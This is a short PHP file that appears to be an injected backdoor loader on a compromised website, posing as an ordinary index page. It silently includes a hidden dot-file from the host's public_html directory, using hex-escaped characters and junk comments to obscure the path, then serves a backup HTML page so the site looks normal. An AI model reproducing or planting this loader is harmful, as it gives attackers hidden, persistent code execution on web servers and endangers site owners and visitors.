<?php
/*7213e*/

@include /*cyq*/("/\x68ome/y765zof1uiuf/public_\x68tml/\x68pwinvipmy.com/ka/.bd90ebc7.oti");

/*7213e*/


echo @file_get_contents('index.html.bak.bak');